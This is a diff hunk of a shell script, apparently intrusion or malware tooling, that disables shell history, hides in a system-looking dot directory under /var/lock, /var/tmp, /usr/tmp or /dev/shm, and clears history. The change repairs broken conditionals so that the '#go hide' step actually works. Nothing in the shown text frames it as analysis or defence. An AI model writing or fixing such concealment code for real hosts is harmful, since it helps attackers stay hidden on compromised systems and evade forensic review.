@@ -7,18 +7,22 @@ unset HISTFILESIZE
 set +o history 2>/dev/null #might error out depending on version
 
 #go hide
-if "cd /var/lock"; then
-	mkdir .SUBSYSTEMvarinfo-0184929
-	cd .SUBSYSTEMvarinfo-0184929 
-else "cd /var/tmp"; then
-	mkdir .SUBSYSTEMvarinfo-0184929
-	cd .SUBSYSTEMvarinfo-0184929
-else "cd /usr/tmp"; then
-	mkdir .SUBSYSTEMvarinfo-0184929
-	cd .SUBSYSTEMvarinfo-0184929
-else "cd /dev/shm"; then
-	mkdir .SUBSYSTEMvarinfo-0184929
-	cd .SUBSYSTEMvarinfo-0184929
+if [ -d "/var/lock" ]; then
+        cd /var/lock
+        mkdir .SUBSYSTEMvarinfo-0184929
+        cd .SUBSYSTEMvarinfo-0184929
+elif [ -d "/var/tmp" ]; then
+        cd /var/tmp
+        mkdir .SUBSYSTEMvarinfo-0184929
+        cd .SUBSYSTEMvarinfo-0184929
+elif [ -d "/usr/tmp" ]; then
+        cd /usr/tmp
+        mkdir .SUBSYSTEMvarinfo-0184929
+        cd .SUBSYSTEMvarinfo-0184929
+elif [ -d "/dev/shm" ]; then
+        cd /dev/shm
+        mkdir .SUBSYSTEMvarinfo-0184929
+        cd .SUBSYSTEMvarinfo-0184929
 fi
 history -c
 
